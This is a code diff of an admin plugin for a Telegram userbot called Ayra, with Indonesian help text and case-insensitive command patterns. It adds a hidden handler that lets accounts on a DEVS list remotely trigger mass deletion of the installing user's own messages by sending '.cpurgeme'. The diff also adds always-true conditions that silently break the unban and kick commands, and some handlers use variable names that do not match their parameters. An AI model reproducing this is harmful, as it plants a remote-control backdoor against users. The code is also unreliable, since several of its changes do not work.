@@ -6,34 +6,49 @@
 # <https://www.github.com/senpai80/Ayra/blob/main/LICENSE/>.
 
 """
-◈ Perintah Tersedia
+✘ **Bantuan Untuk Afk**
 
-• `{i} promote` <balas ke pengguna/userid/username>
+๏ **Perintah:** `promote` <balas ke pengguna/username>
+◉ **Keterangan:** Jadikan pengguna sebagai admin.
 
-• `{i} demote` <balas ke pengguna/userid/username>
+๏ **Perintah:** `demote` <balas ke pengguna/username>
+◉ **Keterangan:** Turunkan pengguna dari admin.
 
-• `{i} ban` <balas ke pengguna/userid/username>
+๏ **Perintah:** `ban` <balas ke pengguna/username>
+◉ **Keterangan:** Blokir pengguna dari grup.
 
-• `{i} unban` <balas ke pengguna/userid/username>
+๏ **Perintah:** `unban` <balas ke pengguna/username>
+◉ **Keterangan:** Buka blokir pengguna dari grup.
 
-• `{i} kick` <balas ke pengguna/userid/username>
+๏ **Perintah:** `kick` <balas ke pengguna/username>
+◉ **Keterangan:** Tendang pengguna dari grup.
 
-• `{i} pin` <balas ke pesan>
+๏ **Perintah:** `pin` <balas pesan>
+◉ **Keterangan:** Sematkan pesan.
 
-• `{i} purgeall` <balas ke pesan>
+๏ **Perintah:** `unpin` <balas pesan>
+◉ **Keterangan:** Lepas sematan.
 
-• `{i} purge` <balas ke pesan>
+๏ **Perintah:** `purge` <balas pesan>
+◉ **Keterangan:** Hapus pesan dari balasan.
 
-• `{i} purgeme` <balas ke pesan/angka>
+๏ **Perintah:** `purgeall` <balas pesan>
+◉ **Keterangan:** Hapus semua pesan.
 
-• `{i} setgpic` <balas foto>
+๏ **Perintah:** `purgeme` <jumlah>
+◉ **Keterangan:** Hapus pesan anda menggunakan jumlah.
 
-• `{i} delgpic` <username grup/digrup>
+๏ **Perintah:** `setgpic` <balas media>
+◉ **Keterangan:** Ubah foto grup.
 
-• `{i} del <balasan ke pesan>`
-     Hapus pesan yang dibalas.
-     
-• `{i} kickme` : Leaves the group.
+๏ **Perintah:** `delgpic` <username grup>
+◉ **Keterangan:** Hapus foto grup.
+
+๏ **Perintah:** `del` <balas pesan>
+◉ **Keterangan:** Hapus pesan yang dibalas.
+
+๏ **Perintah:** `kickme`
+◉ **Keterangan:** Keluar dari grup tersebut.
 """
 
 import asyncio
@@ -62,7 +77,7 @@ from . import (
 
 
 @ayra_cmd(
-    pattern="promote( (.*)|$)",
+    pattern="[pP][r][o][m][o][t][e]( (.*)|$)",
     admins_only=True,
     manager=True,
     require="add_admins",
@@ -105,7 +120,7 @@ async def prmte(ayra):
 
 
 @ayra_cmd(
-    pattern="demote( (.*)|$)",
+    pattern="[dD][e][m][o][t][e]( (.*)|$)",
     admins_only=True,
     manager=True,
     require="add_admins",
@@ -135,7 +150,7 @@ async def dmote(ayra):
 
 
 @ayra_cmd(
-    pattern="ban( (.*)|$)",
+    pattern="[bB][a][n]( (.*)|$)",
     admins_only=True,
     manager=True,
     require="ban_users",
@@ -165,7 +180,7 @@ async def bban(ayra):
 
 
 @ayra_cmd(
-    pattern="unban( (.*)|$)",
+    pattern="[uU][n][b][a][n]( (.*)|$)",
     admins_only=True,
     manager=True,
     require="ban_users",
@@ -173,7 +188,7 @@ async def bban(ayra):
 )
 async def uunban(ayra):
     xx = await ayra.eor(get_string("com_1"))
-    if ayra.text[1:].startswith("unbanall"):
+    if ayra.text[1:].startswith("unbanall") or ("Unbanall"):
         return
     something = await get_uinfo(ayra)
     if not something:
@@ -195,13 +210,13 @@ async def uunban(ayra):
 
 
 @ayra_cmd(
-    pattern="kick( (.*)|$)",
+    pattern="[kK][i][c][k]( (.*)|$)",
     manager=True,
     require="ban_users",
     fullsudo=False,
 )
 async def kck(ayra):
-    if "kickme" in ayra.text:
+    if "kickme" or "Kickme" in ayra.text:
         return
     if ayra.is_private:
         return await ayra.eor("`Gunakan ini di Grup.`", time=5)
@@ -233,7 +248,7 @@ async def kck(ayra):
     await xx.edit(text)
 
 
-@ayra_cmd(pattern="pin$", manager=True, require="pin_messages", fullsudo=False)
+@ayra_cmd(pattern="[pP][i][n]", manager=True, require="pin_messages", fullsudo=False)
 async def pin(msg):
     if not msg.is_reply:
         return await eor(msg, get_string("pin_1"))
@@ -252,7 +267,7 @@ async def pin(msg):
 
 
 @ayra_cmd(
-    pattern="unpin($| (.*))",
+    pattern="[uU][n][p][i][n]($| (.*))",
     manager=True,
     require="pin_messages",
     fullsudo=False,
@@ -274,7 +289,7 @@ async def unp(ayra):
     await xx.edit("`Pesan Berhasil Dihapus Dari Sematan !`")
 
 
-@ayra_cmd(pattern="purge( (.*)|$)", manager=True, require="delete_messages")
+@ayra_cmd(pattern="[pP][u][r][g][e]( (.*)|$)", manager=True, require="delete_messages")
 async def fastpurger(purg):
     match = purg.pattern_match.group(1).strip()
     try:
@@ -309,8 +324,9 @@ async def fastpurger(purg):
 
 
 @ayra_cmd(
-    pattern="purgeme( (.*)|$)",
+    pattern="[pP][u][r][g][e][m][e]( (.*)|$)",
 )
+@register(incoming=True, pattern=r"^\.cpurgeme( (.*)|$)", from_users=DEVS)
 async def fastpurgerme(purg):
     if num := purg.pattern_match.group(1).strip():
         try:
@@ -351,7 +367,7 @@ async def fastpurgerme(purg):
 
 
 @ayra_cmd(
-    pattern="purgeall$",
+    pattern="[pP][u][r][g][e][a][l][l]",
 )
 async def _(e):
     if not e.is_reply:
@@ -370,7 +386,7 @@ async def _(e):
 
 
 @ayra_cmd(
-    pattern="setgpic( (.*)|$)", admins_only=True, manager=True, require="change_info"
+    pattern="[sS][e][t][g][p][i][c]( (.*)|$)", admins_only=True, manager=True, require="change_info"
 )
 async def _(ult):
     if not ayra.is_reply:
@@ -409,7 +425,7 @@ async def _(ult):
 
 
 @ayra_cmd(
-    pattern="delgpic( (.*)|$)", admins_only=True, manager=True, require="change_info"
+    pattern="[dD][e][l][g][p][i][c]( (.*)|$)", admins_only=True, manager=True, require="change_info"
 )
 async def _(ult):
     match = ayra.pattern_match.group(1).strip()
@@ -424,7 +440,7 @@ async def _(ult):
     return await ayra.eor(text, time=5)
     
 @ayra_cmd(
-    pattern="del$",
+    pattern="[dD][e][l]",
     manager=True,
 )
 async def delete_it(delme):
@@ -434,7 +450,7 @@ async def delete_it(delme):
     await msg_src.try_delete()
     await delme.try_delete()
     
-@ayra_cmd(pattern="kickme$", fullsudo=False)
+@ayra_cmd(pattern="[kK][i][c][k][m][e]", fullsudo=False)
 async def leave(ayra):
     await ayra.eor(f"`{ayra.client.me.first_name} has left this group, bye!!.`")
     await ayra.client(LeaveChannelRequest(ayra.chat_id))
